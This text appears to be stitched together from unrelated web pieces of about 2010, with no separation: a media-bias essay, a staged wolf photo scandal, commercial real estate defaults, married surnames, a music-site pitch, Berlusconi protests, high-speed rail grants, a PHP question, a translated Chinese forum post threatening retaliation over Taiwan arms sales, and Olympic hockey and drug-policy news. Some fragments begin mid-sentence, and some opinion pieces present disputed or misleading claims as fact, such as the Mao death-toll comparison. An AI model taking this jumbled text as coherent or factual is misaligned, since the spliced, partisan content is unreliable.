All perform the same duties , but the llanteras are often ridiculed for not having a snappy name .
I spend a great deal of time reading history and watching documentaries .
It is educational , but information is a commodity .
It has the ability to be skewed , bent , disregarded , hidden , disposed of , exaggerated , nostalgized , and outright invented to sway opinion or coerce emotion .
If I turn on the television , I am bombarded with Cold War style reports about attacks from “ terrorists , ” with no one mentioning that there were only two attacks on the territorial USA since Pancho Villa ’s raids in 1916 .
Since that date , the USA has militarily invaded or occupied 45 other nations … not including CIA operations , drug wars , or reconnaissance .
I hear the right wing constantly talking about Mao Zedong ’s policies that killed “ 100 million people in China , ” but that would be close to a normal mortality rate for a country with a population of 1.4 billion .
This is similar to saying that since 2.5 million people on average die in the USA , and George W. Bush was president for eight years , 20 million people died under his policies .
Of course , when Howard Zinn ’s “ People ’s History of the United States ” came out in 1980 , many of us in the left heralded the book as the long awaited true story of historic events , but its testimonies are from persons with opinions and agendas as well .
George Orwell said , “ He who controls the present , controls the past .
He , who controls the past , controls the future . ”
The skewed history and advertising we are surrounded by is like street signs and the lines on the road .
When we first get driver ’s licenses , we are over - aware of the markings and signage , but as we gain experience we grow borderline unconscious to the guiding of our hands .
Today I caught myself becoming fearful of the Taliban gaining control of Pakistan ’s nuclear arsenal , as I was zoning out to the background radio news in traffic .
Yesterday , the urge was strong to grab the Silk ( owned by Philip Morris ) brand soy milk from the supermarket shelf , because the blue and white box was just more appealing than the house brand .
Steered … steered by suggestion .
It ’s no surprise that so many citizens of the USA do not know which way is forward when our direction is constantly being distracted .

The Natural History Museum 's wildlife photographer of the year has been stripped of his £ 10,000 prize , after judges found he was likely to have hired a tame Iberian wolf to stage the image of a species seen rarely in the wild .
The judges of the award , which attracted more than 43,000 entries from 94 countries , said they were convinced José Luis Rodriguez hired the wolf called Ossian from a Madrid wildlife park , contradicting his claim the image was taken in the wild after months of patient tracking of the dwindling species .
Competition rules prohibit the use of animal models and this morning organisers took down Rodriguez 's image from the exhibition at the museum in London , banned him from entering the contest again and announced they were " saddened " by the disqualification .
Apparently without irony , he had titled his image The Storybook Wolf , but headline writers have since dubbed it the " loan wolf " .
Rodriguez could not be contacted , but the competition organisers said he continued to strongly deny the wolf was tame .
" I remember thinking , my God , this really is a wild wolf , what an achievement , " said Mark Carwardine , chairman of the judging panel .
" I do n't understand the mentality at all .
People feel very disappointed with the photographer . "
The organisers said they were planning to erect a notice at the Natural History Museum explaining to visitors their belief that the photo was staged , although it is too late to remove the image from the thousands of books that have been published by BBC Worldwide .
The controversy is thought to be the first time the competition 's expert judging panel have allowed an animal model to win a prize and there was concern the revelation could damage a contest which has a reputation as the most prestigious of its kind in the world .
" The wildlife photographer of the year is the one institution that has pushed us [ animal photographers ] to be more creative , so it is very sad it has happened to this competition , " said Chris Gomersall , a wildlife photographer who was involved in judging .
" In wildlife photography there are ethical guidelines and there has always been an explicit understanding that if you take pictures of a captive subject , you declare it on your caption . "
Rodriguez had told the judges he had sketched the shot he wanted to get on paper , but " could n't quite believe it when he got the shot of his dreams " .
He said his main fear had been that the wolves " would be too wary " .
Jim Brandenburg , a judge and a wildlife photographer with 45 years experience of taking pictures of wolves , marvelled at the image of the animal , captured so clearly and apparently hunting a farmer 's livestock .
He declared it " a masterfully executed moment " , but having studied pictures of Ossian and Rodriguez 's image , he is now " 99.9 % " sure it is a tame wolf , according to Carwardine .
The organisers were alerted to suspicions about the image by Spanish photographers who recognised the wolf and the location as the Cañada Real wildlife park .
Wolf experts also questioned why the wolf would jump the gate when a wild animal was more likely to squeeze between the bars .
The judges said they asked Rodriguez for corroboration of his story and if there was anyone who could act as a witness to back him up , but his answers were inadequate .
Fortunately for President Obama , he did n't have to deliver the State of Commercial Real Estate Address last night ...
Because if he did , there is no amount of spin that he could have used to put a good face on the reality of the situation : commercial real estate is a disaster in the making .
In fact , that point was only underscored earlier this week when the owners of the Stuyvesant Town apartment complex announced they would default on the $ 4.4 billion in loans they used to buy the property at the peak of the commercial bubble .
Now , some four years later , that deal has soured just like the rest of them , as falling rents and plummeting real estate values have turned their big purchase into a no -win situation for everyone involved .
~~ad_0 ~~
That left Tishman Spenser and Blackrock with their only option : handing the keys back to the lender after missing a $ 16.1 million interest payment and watching the value of their property fall 65 % from the peak .
Left with a property now worth only $ 1.9 billion , they simply threw in the towel in one of the most expensive cases of jingle mail on record .
2010 Commercial Real Estate Forecast
But let 's face it , the Stuyvesant Town debacle is just one of the many strategic defaults headed down the pike right now , especially in a down economy .
In that regard , says Aaron Bryson , an analyst at Barclays Capital , " Stuytown is a poster child for the type of aggressive lending that characterized CMBS at the peak of the market .
This is a prime example of these types of loans not working out , and we expect a lot more to come . "
Unfortunately , Bryson is not alone ...
FDIC Chair Shelia
Bair expects the rates of delinquent CRE loans to continue to rise " in the coming quarters , " and she reiterated her belief this week that many more bank failures will occur as a result .
What 's more , she says : " There 's not a whole heck of a lot we can do about it . "
In fact just last Friday , regulators shut down five more banks in New Mexico , Oregon , Washington , Florida , and Missouri — bringing the count of U.S. bank failures so far this year to nine .
And guess what ?
Commercial real estate losses were responsible for a majority of those failures , according to the Federal Deposit Insurance Corp .
" A lot of them were saddled with commercial real estate loans that went sour .
You couple that with weak regional market conditions , and that was a recipe for failure for many of those banks , " said Greg Hernandez , a FDIC spokesman .
The Perfect Storm
That trend will undoubtedly grind on as the defaults quicken their pace .
Over the past year alone , delinquent CRE loans on income - producing properties have risen by 250 % to $ 44.8 billion .
" Not since the early 1990s have we observed this perfect storm of deteriorating rents and occupancies , deflating sales prices , and tight credit that 's leading to a lot of defaults , " writes Victor Calanog , director of research at New York - based real estate research organization Reis .
" With close to $ 3.5 trillion of loans outstanding and at least 12 to 24 more months of rent declines , I expect to see more commercial properties defaulting on loans . "
But despite this " perfect storm , " commercial REITs finished the year strong along with the rest of the markets since reaching a low point on March 6 .
According to NAREIT , the FTSE NAREIT Equity REIT Index was up 7.15 percent in December , with total returns of 27.99 percent for 2009 .
That has been enough to remind investors that just because something is inevitable , that does n't mean it 's imminent ; this is why the commercial real estate sector has confounded the bears since the March bottom .
However , those days may be beginning to wane , since the situation on the ground has gone from bad to worse .
In fact , here 's a look the most recent headlines from the shrinking sector :
Now does that sound like a sector that is going to have a miraculous recovery anytime soon ?
... Of course it does n't .
And those headlines are just a few of the many out there .
In fact , practically every single commercial real estate analyst thinks that — over the course of the next two years — the sector will get much worse before the market bottoms sometime in 2012 .
That being said , there are a whole host of reasons for this sector to collapse ; on the flip side , there is only one reason for it to go up .
But it 's a pretty big one :
The Fed 's wall of liquidity — which can't go on forever .
In fact , even by the Fed 's own admission , its helping hand will return to its pocket over the course of the next six months .
When that happens , CRE will fall even further all the way into 2012 .
Those are facts that can't be glossed over .
The good news :
There is an upside to all of this coming turmoil .

The Name Game
Even if you ’re only a little bit of a feminist , getting married can be tough .
I knew that some of the more archaic traditions could be nauseating but I found myself affronted with some good ole ’ fashioned deep seated sexism when the topic of weddings roles around to last names .
Are you taking his ?
Keeping yours ?
Hyphenating the two ?
Or GASP the worst …is he taking yours ?
I chose to keep my last name .
I ’ve identified myself quite a bit with it and it just seemed like another silly tradition to ignore ; how wrong I was .
I constantly face problems with this , any time we both sign our name and then choose the married box inquisitive looks are to follow .
But more than just the annoyance of people ’s disbelief that we were actually married is the deep and sincere reaction it brings out in people .
Just last August a study from the University of Indiana and University of Utah found that of the 810 women polled 70 % thought that a women should take her husbands last name and half of the women went as far as to say they thought it should be illegal not too .
What this tells me is that there still is a lot of work to be done for women ’s rights .
The perception of women as the quiet nurturer is the very stereotype that is used against us ; as if it ’s somehow easier for women than men to let go of their pre-married selves .
I think more marriages would n’t end in divorce if women were n’t expected to literally change who they are as soon as they ’re married - to quietly sublimate who they were before they became someone ’s wife .
Brian and I thought about other choices .
Hyphening our names just sounded weird and to be totally honest he hates his last name .
The main reason he did n’t do the ( GASP ! ) big one and change his name to mine was because only seven states offer the option for the husband to change his name on the marriage certificate .
In most states the process for the man to change his name is very humiliating and degrading and I would never ask him to do that .
If it was just about a name , society would n’t make men feel so horrible doing it , but the tradition is rooted in ideas of male ownership over women and how she now “ belongs ’ to her husband , bought and sold like any ole ’ commodity .
Those ideas might not be as blatant as they used to be but it ’s roots in submission and power shifts go so deep and potentially inhibit communication , honesty and mutual respect .
So we ’re staying the Navarro / Snider family and people will just have to deal .
This is probably one of the most common questions I get asked when I talk about my website .
It turns out there is not just one answer , which is definitely a good thing .
There are many different ways artists can get paid today .
The most common ones are to sell their CD ’s , sell their merchandise , and sell shows .
But especially with the internet ’s explosion , there are more ways to make money than ever .
I will get to these in a minute .
First of all , selling CD ’s , merch , and shows sounds easy enough , but it all requires effective promotion .
This promotion can be an investment in itself .
Buying magazine or radio ad space can get pretty expensive , and there ’s no guarantees .
Also , online promotion is pretty ineffective at allowing you to reach new people everyday .
You are almost limited to the people you know .
Promotion is the key to how artists earn money , but right now the promotion available sucks !
( unless you sign to a label , spend millions on billboards and tv , and end up a slave to the label for the next 10 years trying to pay everything back , while they keep your rights )
As an artist myself , I designed my website ( Beat - Play – in beta this spring ) to solve this problem .
We utilize a social network system , similar to Twitter , but for music .
You will follow others that you share a taste in music with .. like friends or favorite bands .. and any music that gets saved into a playlist by those people automatically gets sent to your radio player .
You press play , and the music your friends liked enough to save , comes to you .
If you like it , you save it too , and it gets sent to anybody following you .
It ’s a ridiculously viral way to spread the good music .
It is an automated word - of - mouth … and best of all , it ’s free promotion and distribution !
With this promotion it becomes infinitely easier for people to find your music , thus easier for them to buy .
But with this system , CD sales , merch and shows are n’t the only revenue streams available .
With this social network , the more people that listen to your music , share your music , view your profile , videos , and live events , the more money you can make from advertising revenues .
In fact , if you opted to give your music away for free , you could avoid people bypassing your payment page for a torrent , and you can actually track all of the fans you get .
This , with a good ad model that is unobtrusive , but effective , and that gives artists 95 % of the revenues generated at each level , is enough for artist to gain a good steady income , potentially for something as simple as Youtube views !
So let ’s talk about other revenues possible for artists .
Along the same lines of the social network , come the opportunities for live streaming concert ticket sales , regular ticket sales , increased booking of shows , paid video music lessons , blogs , musician competitions and battles for money prizes , auctioning off of samples , sound effects , instrumentals , lyrics , sheet music , rights , ect , and even purchasing and selling of instruments and gear , among many other things .
Add this to advertising revenue for all pages with an artist ’s content , including videos , music , blogs , merch , fan groups , and anything else , merchandise sales , CD sales , and shows , and the full time independent artist may be more prevalent than ever would have been expected .
The most important thing to remember in order for this to become a reality , is that independent artists need to organize together as a whole , and support one website .
The reason for one is simple .
Every band or artist has their followers , but right now they ’re all spread out on different websites , and not all of them transfer over .
If there was one site , the cross pollination of fans alone would be enough to create a huge boost in artist ’s views and promotion .
Add all of the revenue streams I ’ve been talking about to that single , strong community of indie artists , and you ’re looking at a stable , independent industry , run efficiently , and very cost - effectively .
And best of all , it ’s free to join and use , and costs nothing up front , not even risk .
The question of how artists can make money is a rarely answered one today , mostly for lack of good answers , but with a good tool , and the power of the internet to connect people , the answers to this question could go on as long as an artist ’s creative imagination .
The picture is starting to change , and the future is really looking up .
Did n’t even realize ?
Now you do…cheer up !

By following the advice of the same people who helped guide our economy to the precipice of total collapse , President Obama now threatens to push it over the edge , says Euro - Pacific CEO Peter Schiff .
“ Notwithstanding ( Obama ’s ) well - crafted lip service regarding future spending restraint , the essence of his current program is for more government spending and larger deficits , ” Schiff writes at lewrockwell.com .
“ For all his talk about job creation , his policies will further burden those who might otherwise create those jobs with higher taxes and more regulation . ”
While President Obama did call for tax cuts for the middle class and offered what amounts to bailouts for those struggling to repay student loans , such cuts do nothing to promote growth in the near term and will add to the deficits in the long term , Schiff points out .
“ To lead us back to brighter days , he articulated a vision of a centrally planned recovery , where clean energy and a Soviet style five - year plan to double our exports would make our economy preeminent once more , ” Schiff says .
“ He fails to understand that the only reason our economy rose to the top in the first place is that the government left it alone .
As a result , instead of seeding the soil for a real recovery we are setting the stage for a prolonged depression . ”
President Obama ’s federal budget proposal would eliminate subsidies for fossil fuels , invest more money in clean energy projects and cut funding for 120 federal programs , including some at the Interior Department , The New York Times reports .

Critics accuse Mr Berlusconi of seeking to silence the judiciary
Ten of thousands of Italians have demonstrated in Rome against Prime Minister Silvio Berlusconi , over what they say are attempts to evade justice .
Mr Berlusconi is on trial in two corruption cases but legislation being discussed in parliament would in effect stop him going to court .
The protesters accuse the PM of seeking to undermine the legal system .
He says he is the victim of political persecution by the judiciary , which he recently compared to the Taliban .
Some demonstrators carried banners reading : " Enough , the law is the same for everyone . "
" We are starved of legality , " said Angelo Bonelli , head of Italy 's Green party .
" Today , the real Taliban is Berlusconi who wants to tie the hands of the magistrates . "
On Friday , Mr Berlusconi told supporters there was " a subversive aim " of bringing down his government .
" If the prosecutors do n't like a law then they challenge it and it gets rejected by the courts , " he said .
" We are in the hands of this band of Taliban . "
Italy 's National Association of Magistrates condemned Mr Berlusconi's speech as " an intolerable escalation of insults and aggression " .
The exchange prompted President Giorgio Napolitano to call for calm .
Mr Berlusconi is on trial for allegedly bribing British lawyer David Mills into providing false testimony in previous trials , and for alleged tax fraud relating to business before he entered politics .
Two bills being considered by MPs would suspend legal proceedings .
Spanish blog MuyComputer claims that Microsoft will present the " Zune Phone " this February , at the MWC in Barcelona .
According to them , it 's 100 % confirmed .
Since the phone will use Tegra , Nvidia will team with Microsoft for the anti-JesusPhone debut .

Talking to the blog editorial director Javier Pérez Cortijo , he told me that " the Zune Phone presentation at Barcelona 's Mobile World Congress 2010 is 100 % confirmed . "
I 've been a close friend of Javier for a couple of decades — he was my first editor — and I completely trust his sources and his judgement , so this is a good one .
As we 've heard before , this is n't actually going to be a " Zune Phone " in that it 's Zune , with a phone attached .
It 's going to be Windows Mobile 7 with Zune software , just like how the iPhone has iPod software on it .
The presentation of the Windows Mobile 7 at MWC 2010 , which we 've been hearing about for a few months now , seems to be inline with the mention of three phones in the Zune software last week , and previous rumors about its introduction .

Judges said
Theo 's design ' captured the essence of cycling '
A design by a West Yorkshire teenager has been chosen from more than 3,000 entries to become a new 50 p coin inspired by the Olympic Games .
Theo Crutchley - Mack , 16 , from Halifax , said it was " absolutely amazing " that his picture of a cyclist in a velodrome was chosen by the Royal Mint .
His design was also seen and approved by the Queen .
Up to three million of Theo 's coins will be released into circulation later this year .
" Just the thought of my design going throughout England and millions of people seeing my design , that 's just absolutely amazing , I can't think of much better than that , " Theo said .
Dave Knight , head of commemorative coins at the Royal Mint , explained the judges ' choice .
" It 's a very good design , irrespective of Theo 's age , it is very good , " he said .
Theo 's prize included a gold coin featuring his design
" It is technically very proficient , and he has really captured the essence of speed and cycling in general , " he said .
Theo was awarded with a special commemorative gold coin featuring his design .
The teenager , who is a keen cyclist himself , described how the picture had been lost under a pile of papers before his mother found it and encouraged him to send it in to the competition .
Theo 's coin is the second in a series of 29 officially licensed commemorative Olympic 50 p coins .
The first was created by nine - year - old Florence Jackson and unveiled in October last year .
Each coin in the series depicts a different Olympic and Paralympic sport , with the remaining 27 coins to be announced later this year .
We finally have a plan for high - speed rail in the United States .
The Obama Administration , which has long made it clear high - speed rail should be a national priority , on Thursday released its long - awaited list of high - speed rail project stimulus money .
The official list of projects can be found here ( PDF ) , and as usual Yonah Freemark breaks it down nicely .
The exact distribution of the $ 8 billion earmarked for HSR in the American Recovery and Reinvestment Act ( aka the stimulus bill ) has long been the subject of rumor and speculation .
As applications poured in , pundits and commenters suggested everything from divvying the money up equally among the projects to giving the whole pot to one mega- project .
What stands out about the awards is their piecemeal nature .
While the infusion of cash will bring practical , measurable benefits , high - speed rail is so mind - bogglingly expensive ( the California high - speed rail project alone is estimated at $ 40 billion ) and the grants are spread so thinly that many of the benefits we 'll see will be tiny .
We can draw three conclusions from this .
First , the Obama administration is serious about establishing a nationwide high - speed rail network .
Although the plan allocates $ 620 million to speed up trips between Richmond , Virginia and Charlotte , North Carolina , the largest benefits will come from connecting that line to the Northeast Corridor in Washington , DC and the proposed high speed rail hub in Atlanta .
A line linking Madison , Wisconsin with Milwaukee is nice , but hooking it up with the hub in Chicago is really worth salivating over .
Second , states cannot depend entirely on federal money to bankroll these projects .
No one received everything they wanted for their projects .
Much of what was allotted , particularly in California and Illinois , provides a financial boost to states that already have pledged money .
The long - overdue federal transportation bill pending before Congress sets aside a small ( relatively speaking for high - speed rail ) sum to be handed out annually , but other big announcements in Obama 's speech – a freeze on discretionary spending , significant earmark reform , etc - may limit or do away with traditional sources of money that might otherwise be available for high - speed rail .
Third , some is better than none .
Many of the stimulus grants aim to increase train speed trains to 110 mph , despite the technology available to increase it to 220 or more .
The Northeast Corridor is a prime candidate for increased - speed funding – although the trains running that line are capable of 150 mph , most places along the tracks do n't allow it .
That greatly suppresses potential ridership .
The NEC will have to make do with a $ 112 million grant for crucial but relatively minor upgrades .
Obama can expect to take flack from both sides of the HSR argument .
Fiscal conservatives will blast the grants as a waste of money , and high - speed rail supporters will criticize them as spread too thinly to provide much benefit to any one project .
Obama has found an unhappy medium , but it effectively lays the groundwork for what will hopefully be a cash - filled future .

I know this sounds like a point - whoring question but let me explain where I 'm coming from .
Out of college I got a job at a PHP shop .
I worked there for a year and a half and thought that I had learned all there was to learn about programming .
Then I got a job as a one - man internal development shop at a sizable corporation where all the work was in C# .
In my commitment to the position I started reading a ton of blogs and books and quickly realized how wrong I was to think I knew everything .
I learned about unit testing , dependency injection and decorator patterns , the design principle of loose coupling , the composition over inheritance debate , and so on and on and on - I am still very much absorbing it all .
Needless to say my programming style has changed entirely in the last year .
Now I find myself picking up a php project doing some coding for a friend 's start - up and I feel completely constrained as opposed to programming in C# .
It really bothers me that all variables at a class scope have to be referred to by appending ' $ this - > ' .
It annoys me that none of the IDEs that I 've tried have very good intellisense and that my SimpleTest unit tests methods have to start with the word ' test ' .
It drives me crazy that dynamic typing keeps me from specifying implicitly which parameter type a method expects , and that you have to write a switch statement to do method overloads .
I can't stand that you can't have nested namespaces and have to use the :: operator to call the base class 's constructor .
Now I have no intention of starting a PHP vs C# debate , rather what I mean to say is that I 'm sure there are some PHP features that I either do n't know about or know about yet fail to use properly .
I am set in my C# universe and having trouble seeing outside the glass bowl .
So I 'm asking , what are your favorite features of PHP ?

Virtually everyone expects
Google to announce something to do with social networking today .
But Google is n't telling , and the result is all guesswork .
Here are a bunch of ideas from Twitter of all the things many would like to hear Google announce today .
Virtually everyone expects
Google to announce something to do with social networking today , when the company holds a press conference at 1 PM ET .
Maybe it 's some Twitter - like functionality inside of Gmail .
But Google is n't telling , and the result is all guesswork .
What if everyone is wrong ?
Here are a bunch of ideas from Twitter of all the things people would like to hear Google announce today .
1. ) " We 're Buying Twitter " :
Well , this is wishful thinking .
Google has bought its share of companies and technologies , but I think Twitter 's valuation might be too high for Google 's blood .
2. ) Preview Panes in Gmail : Nice , simple upgrade to the popular web mail app .
If they do , it 'll show up quietly in Gmail Labs .
3. ) Google Reveals Exactly
What 's it 's Doing with the NSA :
There have been reports that Google is working closely with the National Security Agency , but no one seems to know why .
Do n't expect Google to talk about this .
4. ) Google Voice is Going Open :
You do n't need an invite ; you could simply go to Google voice and sign up today .
It would be nice , but it 's definitely not newsworthy .
5. ) Google Lowers the Price on Unsubsidized Nexus Ones : Would n't it really be HTC lowering the price ?
Google 's not making money on this phone , but HTC probably is .
I doubt they 'll want that to change .
6. ) Google Announces Rescue Plan for NASA : With the Obama Administration pretty much abandoning the program , this would be a great opportunity for the space - loving Google to step in .
Again , doubtfuleven Google does n't have that much money .
7. ) A Promise Never to Allow Data Mining : Google needs to mine its data to deliver valuable insight to clients and partners .
They do it in ways that do not reveal private data .
Do n't expect any of that to change .
8. ) Google Unveils a Shipping Chrome Netbook or Tablet : The Chrome OS is months , if not a year , away from commercial availability .
This will not happen .
9. ) Google Updates Android : Android 2.1 is just arriving on Droids , but there is a chance , I guess , that this could be a big Android 3.0 announcement .

Downloading Il Duce Mussolini iPhone App Stirs Passions in Italy
An iPhone application offering the speeches of the World War II dictator Benito Mussolini has become a bestseller in Italy .
While the app's creator defends it as a valuable historical tool , others claim it is glorifying fascism .
VANCOUVER , British Columbia  Gary Bettman could be finding himself boxed into a corner , his position that N.H.L. participation in future Olympics may not be worth the sacrifice rendered untenable by the big television audience last Sunday for the game between Canada and the United States .
Bettman , the N.H.L. commissioner , has suggested that shutting down for 15 days may be more costly to the league than the benefits it derives from having its stars showcased internationally .
The league gets no revenue from Olympic telecasts , but the high viewership numbers suggest that the N.H.L. is getting more exposure from the Olympics than Bettman or anyone else expected .
Even if his reluctance to embrace participation in future Winter Games is mainly a bid for leverage in negotiations for a piece of the Olympic pie or in talks with the N.H.L. Players ’ for a new collective bargaining agreement , it is becoming increasingly difficult to envision saying goodbye to a platform that provides undeniable benefits to the N.H.L .
According to figures , the game had 10.8 million viewers in Canada , making it the most - watched sports program in Canadian television history , and 8.2 million in the United States on the cable news channel MSNBC , matching the channel ’s election - night viewership .

From China.com :
About America Selling Arms to Taiwan
America is a country where politics serve economics .
Actually , Americans do n’t have any broad political goals .
Their behavior , to phrase it colloquially , appears to be very realist ; of course , it ’s because they do things serving their own interest that it seems realist .
To a businessperson , profit is prestige .
Without profit you have no prestige , and it is like this for America , their prestige comes from their profit .
To a businessperson , even if it ’s just a small trickle of profit it ’s important .
Even if this tiny profit will cause them to offend others , generally they will still take it , and restore relations with the offended parties later , if they think it ’s worth it .
America is also like this .
For Americans , it serves great national interest to make things go poorly between [ Mainland ] China and Taiwan .
In the context of modern global security , possibly no one would dare to be fighting battles and ultimately having a [ military ] showdown , so struggles take the bloodless forms of attempting to change culture , politics , economics , etc . [ Struggles also manifest through ] trying to keep one ’s own country stable while trying to make the opposing nation unstable .
In chaos there is profit , and perhaps in chaos the opposition can be undermined .
This is just like the way the US treated the Soviet Union .
America is selling arms to Taiwan again .
As far as we ’re concerned , this is old , stinking news ; what is America ’s meaning [ in doing this ] ?
The US is stirring up new conflict between the two shores [ i.e. , China and Taiwan ] .
[ America is saying , ] you can talk , but talking is only talking , you ca n’t get too close and definitely can’t unify , because that would n’t be in the best interests of us Americans .
It ’s been sixty years , Taiwan is a painful spot that is difficult for our nation to hide ; for many reasons , the Taiwan problem has never been resolved .
Now we ’ve come to the best time ever for cross - strait relations , but the Americans ’ behavior has once cast a dark shadow [ over the progress ] , can we just allow this to take its course ?
In truth , I personally feel that America can sell as many weapons to Taiwan as it wants , all that it takes is for us to be willing and those weapons are ours .
Did n’t America once give us [ China ] many weapons via Chiang Kai-Shek ?
The Nationalist Party has never been able to accomplish anything great , to say nothing of the Democratic Progressive Party .
Those in current Taiwanese political circles are n’t qualified politicians , they ’re just mediocre people who ’ve taken on politics as a profession , what can they ever change ?
Look at that Chen Shuibian .
Are you independent ?
Is n’t that your political ideology ?
Not only is [ Taiwan ] not independent , he ’s eaten up an enormous sum of the Taiwanese people ’s money !
So , Taiwan has no talented administrators ; Americans selling them weapons is useless .
America cannot stop the unification of Taiwan .
When the unification happens will be decided by China .
We do n’t fear war , [ but ] we hope to use great sincerity to peacefully unify Taiwan .
After all , the ‘ brothers ’ on either side [ of the strait ] are not strangers .
If Taiwan is incited by the Americans , and ignores the feelings of the people and goes against common sense , then the weapons will have to come out .
Taiwan , do n’t naively think that you can divide up the family , this family you cannot separate from !
America , do n’t naively think that you can split up China , you do n’t have the skill .
Moreover , do n’t think that the Chinese people wo n’t bear a grudge , the Chinese are the best in the world at bearing grudges .
If you do n’t fear retribution , keep making trouble , if you do n’t , it would be so boring !
I think we can retaliate against America !

America has already learned the lesson : making endless concessions to China can only further intensify it , make it refuse democracy , and become enemies with the world .
When weighing the balance between democracy and economy , Americans finally decided that the value of democracy was much greater than the value of the economy !
Otherwise , they would have avoided FDR ’s serious postwar mistake with China !
Now we ’ve come to the time of restoring the original spirit !
北冥教主 [ in response to the above comment ] :
American democracy is n’t valuable , it is n’t real democracy !

Taiwan ’s doing it as insurance , America ’s doing it for money .
[ In Taiwan ] they have permanent property ownership rights , [ if they ] come back it changes to seventy - year use rights , and [ houses ] can be torn down at any time .
Consider it , what would you think ?

In the past thirty years , China has already become a country that ’s only looking for money .

Calgary Flames defenceman Robyn Regehr sent out a Twitter message on Saturday that read : " If the Americans win , they 'll probably make a movie about it , so we do n't want to see that happen . "
Canadian head coach Mike Babcock remarked on the eve of the 2010 Olympic men ’s hockey gold - medal final between Canada and the United States that he agreed with Regehr .
" I like his way of thinking , " said Babcock , who has seen the film Miracle that chronicled the improbable run of the United States men ’s hockey team to gold at the 1980 Olympics in Lake Placid .
" My kids thought it was great .
I ’m not so sure it was that great . "
Even U.S. defenceman Ryan Suter , whose father Bob played on that Cinderella team 30 years ago , stated that his team is not drawing much inspiration from the 1980 team .
" I do n’t think it is as big as people make it out to be , " Suter said .
" We ’re trying to win for ourselves . "

While in Vancouver , Canada has practised in the late afternoon on most days to get accustomed to their 4:30 p.m. PT start times for its first four games .
The Canadians did n’t skate the day before the 6:30 p.m. PT semifinal match against Slovakia .
On Saturday , however , the Canadians skated at noon , the same time as the gold medal final on Sunday .
" I do n’t think it would matter if the game was at midnight .
Let ’s get at it , " Canadian forward Jarome Iginla said .
Babcock on the weight of winning for Canada : " Do n’t get me wrong , we ’d like to do it for the country .
We ’d like to win if for everyone involved .
But first we want to do it for ourselves . "
Niedermayer , 36 , was asked why he shaved his gray whiskers on the eve of the gold - medal game , " Just so I did n’t look like everyone else ’s Dad out there . "
A prankster posing as Miller got himself on MSNBC and guaranteed a win over Canada .
The network apologized for being fooled .
If Canada can turn the tables on its North American rivals , maybe the casting call can go out for an actor to play Babcock in a Canadian flick .
After all , if Canada wins gold on Sunday he would become the first coach in hockey history to win Olympic gold , a world championship and a Stanley Cup .
He also has world junior and Canadian university crowns to his credit .
This is n’t Babcock ’s only motivation , however .
He would like to beat U.S. general manager Brian Burke because when Burke took over the Anaheim Ducks he would n’t renew Babcock ’s contract .
Burke wanted to bring in his own man , Randy Carlyle .
But in order for Babcock , who was there live to see skip Kevin Martin and the men ’s curling team take gold on Saturday , to make history the Canadians must solve that scrawny 6 - foot - 2 , 175 - pound wall known as U.S. goalie Ryan Miller .
Miller enters the championship game with a tournament - leading .954 save percentage ( 103 saves out of 108 shots ) and has n’t allowed a goal in his last 111 minutes and 38 seconds .
" As much as is made about goaltending stealing games in this tournament , a goaltender really does reflect his team , " Miller said .
" If you guys sat down and broke down our film you can see our team is playing really well .
A prime example is the last game against Finland . "
Babcock remarked that Canadian assistant coach Lindy Ruff , who coaches Miller with the Buffalo Sabres , knows all of Miller ’s weaknesses .
The Canadians talked about getting more traffic , screens and deflections on the brilliant netminder than they did in the 5 - 3 U.S. win in the preliminary round last Sunday .
Ruff and Miller have not had any contact with each other in Vancouver .
" We shared the same flight out here , " Miller said .
" I got him a sausage McMuffin at McDonalds while he made sure he had a seat on the flight .
I told him that was going to be the last favour I was going to do for him . "
Scott Niedermayer , the laid - back Canadian captain believes that his team ca n’t get caught up in how well Miller has played and the roll that the undefeated U.S. team has been on .
" We have to go out and play our game as well as we can , " Niedermayer said .
" You ca n’t make them not play well .
You have to go out and make it difficult for them .
We need to play well defensively and skate hard make it tough in their end . "
On the other side of the rink , U.S. centre Ryan Kesler proclaimed he would share all the holes to exploit of his Vancouver Canucks teammate Roberto Luongo , Canada ’s goalie .
Young Canadian centre Jonathan
Toews , who will play a key role in shutting down the U.S. line of Paul Stastny , Zach Parise and Jamie Langenbrunner , was asked what Canada learned from its first outing against the U.S .
" There is a lot we want to differently , " Toews said .
" There was a lot we did well in that game .
But there were a lot of mistakes made .
We gave them a lot of chances .
They did n’t really have to work for it .
Any bit of success they will get , they will have to earn it .
We ’ll make them pay the price .
We want to play much more intelligently on the defensive side of the puck . "
Canadian defenceman Chris Pronger agreed with his teammate and added , " We want to get off to a better start .
We want to come out just as hard , if not harder , than we did against Russia .
We understand that the way they want to play is similar to the way we want to play .
" We also want to come out of our end a little bit cleaner .
At points in that game it was a little bit hectic .
We also want to continue to chip pucks into their end and be physical .
We want to make them come 200 feet .
We need to limit our turnovers because they are a team that can transition very quickly . "
Niedermayer summed up the situation best .
" It ’s a big game , probably ca n’t get any bigger , " he said .
" It ’s a special time to be a good hockey player . "
Latin America , being asked to stop decriminalizing drugs , received a harsh slap on the wrist by a United Nations body today for the burgeoning movement in various countries to decriminalize small amounts of drugs .
Drug reform activists have hailed the moves as a new approach that refocuses resources on big - time traffickers and views drug abuse as a health problem instead of a police problem .
( How Mexico quietly decriminalized drug use . )
But the Vienna - based International Narcotics Control Board ( INCB ) , in its annual report released today , stated its concern over Latin America ’s “ growing movement to decriminalize the possession of controlled drugs , in particular cannabis . ”
After decades of hewing to the US ’s tough stance , some Latin American nations in recent months have moved toward more leniency for personal possession , particularly of marijuana .
( How Latin America is breaking ranks with the US . )
Loosening up , one by one
Last year Mexico decriminalized possession of heroine , cocaine , and other drugs found in small amounts .
Argentina followed with a Supreme Court ruling stating the unconstitutionality of the arrest of five youths carrying a small amount of marijuana .
Brazil has also introduced legislation to replace jail sentences with educational measures .
The INCB report says : “ The board is concerned that the movement , if not resolutely countered by the respective governments , will undermine national and international efforts to combat the abuse of and illicit trafficking in narcotic drugs .
… The movement poses a threat to the coherence and effectiveness of the international drug control system and sends the wrong message to the general public . ”
Whether the message will have an impact on the movement remains to be seen .
It could be used by those governments who still support the so - called “ war on drugs ” to bolster their positions .
“ It will be used politically , ” says Jorge Hernández Tinajero , the president of Cupihd , a group in Mexico that disseminates information about drug policies .
“ Those governments in the region pushing for a war against drugs will use it to bolster their argument . ”
' Unwarranted intrusions ' ?
But the INCB was rebuked by leading drug policy - reform groups .
The Transnational Institute ( TNI ) and the Washington Office on Latin America ( WOLA ) said in a press release today that “ the criticisms clearly overstep the INCB 's mandate and constitute unwarranted intrusions into these countries ' sovereign decision - making . ”
